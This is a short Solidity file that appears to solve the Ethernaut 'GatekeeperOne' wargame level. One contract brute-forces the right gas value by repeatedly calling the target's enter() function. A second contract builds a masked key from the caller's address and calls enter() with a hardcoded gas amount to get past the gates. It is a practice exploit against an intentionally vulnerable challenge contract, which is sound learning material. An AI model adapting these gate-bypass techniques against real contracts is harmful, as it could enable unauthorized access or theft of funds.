// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract getGas {

    event Failed(bytes reason, uint256 gas);
    function get(address _victim) public {
        IGatekeeperOne victim = IGatekeeperOne(_victim);

        uint256 gas = 100000;
        for(uint256 i; i< 8191; ++i) { // pigeon hole principle
            gas += 1;
        
        try victim.enter{gas:gas}('0x01') {}
        catch(bytes memory reason) {
            emit Failed(reason,gas);
        }
    }
}
}

contract Attack {
    function attack(address _victim) public {
        IGatekeeperOne victim = IGatekeeperOne(_victim);
        bytes8 key = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF); //bit wise operation to pass the third gate
        victim.enter{gas:106739}(key); // use the gas got from getGas() function
    }
}
